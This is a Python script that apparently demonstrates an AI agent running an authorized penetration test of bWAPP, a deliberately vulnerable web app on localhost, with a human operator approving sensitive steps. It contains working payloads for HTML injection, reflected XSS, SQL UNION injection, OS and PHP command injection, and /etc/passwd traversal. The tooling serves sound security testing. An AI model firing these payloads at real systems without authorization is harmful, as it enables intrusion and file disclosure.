#!/usr/bin/env python3
"""BLIND authorized penetration test of bWAPP, driven 100% over aitmproxy's MCP bus.

Roles shown live:
  * agent    (Mcp role, policy=auto): all discovery + live exploitation.
  * operator (human-in-the-loop):     authorizes the Sensitive poc.run reproductions.

Every finding below is backed by evidence observed THROUGH aitmproxy during this run.
"""
import base64
import re
import sys
import time
import urllib.parse as up

sys.path.insert(0, "/Users/matt/Security/aitmproxy/.claude/worktrees/blind-pentest-bwapp-542fcf/bwapp-assessment")
import mcpcli
from mcpcli import Bus

AGENT = "f53c2ce661e3992b2824b9d24aed6b899155c4a790056007"
OPERATOR = "064a8a192406bb42a9413881659b2d4e37a70b3698aa508d"
TARGET = "http://127.0.0.1:8088"
AUTH = "127.0.0.1:8088"
POCDIR = "/Users/matt/Security/aitmproxy/.claude/worktrees/blind-pentest-bwapp-542fcf/bwapp-assessment/pocs"
PAUSE = 1.2


def hr(c="="):
    print(c * 78)


def banner(t):
    print()
    hr()
    print("  " + t)
    hr()
    time.sleep(PAUSE)


def text(res):
    r = res.get("result", res)
    sc = r.get("structuredContent")
    if sc is not None:
        return sc
    return r.get("content", [{}])[0].get("text")


def decode(b):
    try:
        return base64.b64decode(b).decode("utf-8", "replace")
    except Exception:
        return b or ""


def agent_send(agent, method, path, body=None, cookie=None):
    h = {}
    if cookie:
        h["Cookie"] = cookie
    req = {"method": method, "scheme": "http", "authority": AUTH, "path": path, "headers": h}
    if body is not None:
        h["Content-Type"] = "application/x-www-form-urlencoded"
        req["body"] = body
    fid = text(agent.call("request.send", req))
    detail = agent.call("flow.detail", {"id": fid})["result"]["structuredContent"]
    resp = detail.get("response", {})
    return fid, resp, decode(resp.get("body", ""))


CLASSES = [
    dict(key="html-injection", title="HTML Injection - Reflected (GET)", cls="html_injection",
         sev="medium", page="htmli_get.php", poc="01-html-injection.yaml",
         method="GET", mk=lambda: "/htmli_get.php?" + up.urlencode({"firstname": "<h1>AITM-PROOF</h1>", "lastname": "x", "form": "submit"}),
         proof=r"<h1>AITM-PROOF</h1>", desc="firstname reflected unescaped into HTML"),
    dict(key="sqli", title="SQL Injection (GET/Search) - UNION exfiltration", cls="sqli",
         sev="critical", page="sqli_1.php", poc="02-sqli-get-search.yaml",
         method="GET", mk=lambda: "/sqli_1.php?" + up.urlencode({"title": "zz' UNION SELECT 1,concat('AITMSQLi-',version()),3,4,5,6,7-- -", "action": "search"}),
         proof=r"AITMSQLi-[0-9.]+", desc="UNION injects attacker columns; DB version exfiltrated"),
    dict(key="os-command", title="OS Command Injection (RCE)", cls="os_command_injection",
         sev="critical", page="commandi.php", poc="03-os-command-injection.yaml",
         method="POST", path="/commandi.php",
         body="target=" + up.quote("www.nsa.gov; id") + "&form=submit",
         proof=r"uid=\d+\([a-z-]+\)", desc="shell metachar runs 'id' as www-data"),
    dict(key="xss-reflected", title="Cross-Site Scripting - Reflected (GET)", cls="xss_reflected",
         sev="high", page="xss_get.php", poc="04-xss-reflected-get.yaml",
         method="GET", mk=lambda: "/xss_get.php?" + up.urlencode({"firstname": "<script>window.__aitm='PROOF'</script>", "lastname": "x", "form": "submit"}),
         proof=r"<script>window\.__aitm='PROOF'</script>", desc="script element reflected verbatim"),
    dict(key="php-code", title="PHP Code Injection (RCE)", cls="php_code_injection",
         sev="critical", page="phpi.php", poc="05-php-code-injection.yaml",
         method="GET", mk=lambda: "/phpi.php?" + up.urlencode({"message": "system('id')"}),
         proof=r"uid=\d+\([a-z-]+\)", desc="message passed to a PHP eval sink; system() runs"),
    dict(key="dir-traversal", title="Directory / Path Traversal", cls="directory_traversal",
         sev="high", page="directory_traversal_1.php", poc="06-directory-traversal.yaml",
         method="GET", mk=lambda: "/directory_traversal_1.php?" + up.urlencode({"page": "../../../../../../etc/passwd"}),
         proof=r"root:.*:0:0:", desc="../ escapes the base dir; /etc/passwd disclosed"),
    dict(key="lfi", title="Local File Inclusion (RFI/LFI)", cls="local_file_inclusion",
         sev="high", page="rlfi.php", poc="07-local-file-inclusion.yaml",
         method="GET", mk=lambda: "/rlfi.php?" + up.urlencode({"language": "../../../../../../etc/passwd", "action": "go"}),
         proof=r"root:.*:0:0:", desc="language param included as a file path; /etc/passwd read"),
]


def main():
    agent = Bus(AGENT)
    operator = Bus(OPERATOR)

    banner("aitmproxy BLIND agentic pentest  —  target: " + TARGET + "  (authorized)")
    print("The assessing agent has NO prior knowledge of the target. Everything below")
    print("is discovered and proven through aitmproxy's MCP bus, live.")
    time.sleep(PAUSE)

    banner("[posture] deny-by-default — operator confirms scope is locked to the target")
    operator.call("agent.set", {"policy": "auto"})
    print("agent.status :", text(agent.call("agent.status", {})))
    print("scope.list   :", text(agent.call("scope.list", {})))
    print(">> agent policy 'auto': read/write run autonomously; Sensitive needs the operator.")
    time.sleep(PAUSE)

    banner("[recon] authenticate through the proxy and fingerprint the stack")
    fid, resp, _ = agent_send(agent, "POST", "/login.php",
                              body="login=bee&password=bug&security_level=0&form=submit")
    setck = [v for (k, v) in resp.get("headers", []) if k.lower() == "set-cookie"]
    sess = None
    for v in setck:
        m = re.search(r"PHPSESSID=([^;]+)", v)
        if m:
            sess = m.group(1)
    cookie = "PHPSESSID=%s; security_level=0" % sess
    server = dict((k.lower(), v) for k, v in resp.get("headers", [])).get("server", "?")
    powered = dict((k.lower(), v) for k, v in resp.get("headers", [])).get("x-powered-by", "?")
    print("login flow   :", fid)
    print("Server       :", server)
    print("X-Powered-By :", powered, "  <-- outdated components (A9)")
    print("session      :", cookie)
    time.sleep(PAUSE)

    banner("[recon] crawl the authenticated portal and enumerate the attack surface")
    _, _, body = agent_send(agent, "GET", "/portal.php", cookie=cookie)
    menu = re.findall(r"<option value='[0-9]+'>([^/<][^<]*)</option>", body)
    print("portal.php reachable; enumerated %d distinct vulnerability exercises, incl.:" % len(menu))
    for label in ["SQL Injection (GET/Search)", "OS Command Injection", "PHP Code Injection",
                  "Cross-Site Scripting - Reflected (GET)", "Directory Traversal - Files",
                  "Remote & Local File Inclusion (RFI/LFI)"]:
        if any(label in m for m in menu):
            print("   -", label)
    time.sleep(PAUSE)

    findings = []
    for i, c in enumerate(CLASSES, 1):
        banner("[%d/%d] %s   (severity: %s)" % (i, len(CLASSES), c["title"], c["sev"].upper()))
        path = c.get("path") or c["mk"]()
        body = c.get("body")
        print(">> agent sends live payload via request.send  (%s %s)" % (c["method"], c["page"]))
        fid, resp, rbody = agent_send(agent, c["method"], path, body=body, cookie=cookie)
        m = re.search(c["proof"], rbody)
        print("   flow:", fid, " http", resp.get("status"))
        if m:
            s = rbody[max(0, m.start() - 30):m.end() + 40].replace("\n", " ")
            print("   OBSERVED EVIDENCE: ...%s..." % s)
            print("   -> %s" % c["desc"])
        else:
            print("   !! no evidence match (unexpected)")
        time.sleep(PAUSE)

        print(">> operator authorizes + runs the reproducible PoC  (%s)" % c["poc"])
        pr = operator.call("poc.run", {"poc_path": "%s/%s" % (POCDIR, c["poc"]),
                                       "target": TARGET, "vars": {"cookie": cookie}})
        res = text(pr)
        passed = isinstance(res, dict) and res.get("passed")
        cap = res.get("finding_capture") if isinstance(res, dict) else None
        print("   poc.run ->", "PASSED" if passed else "FAILED", " (capture %s)" % cap)
        time.sleep(0.6)

        print(">> record the finding")
        rec = agent.call("findings.record", {
            "title": c["title"], "class": c["cls"], "severity": c["sev"],
            "target": "%s/%s" % (TARGET, c["page"]), "poc_ref": c["poc"],
            "flows": [fid] + ([cap] if cap else []),
            "notes": "Confirmed live via aitmproxy. Evidence: %s. PoC %s passed." % (c["desc"], c["poc"]),
            "passed": bool(passed),
        })
        fidrec = text(rec)
        print("   findings.record ->", fidrec)
        findings.append((c["title"], c["sev"]))
        time.sleep(PAUSE)

    banner("[report] findings.list  (persisted by aitm-findings)")
    lst = text(agent.call("findings.list", {}))
    n = len(lst) if isinstance(lst, list) else "?"
    print("Total findings recorded:", n)
    for t, s in findings:
        print("   [%-8s] %s" % (s.upper(), t))
    print()
    print("All findings above were proven live through aitmproxy. Scope stayed locked")
    print("to", TARGET, "throughout (deny-by-default everywhere else).")
    hr()


if __name__ == "__main__":
    main()
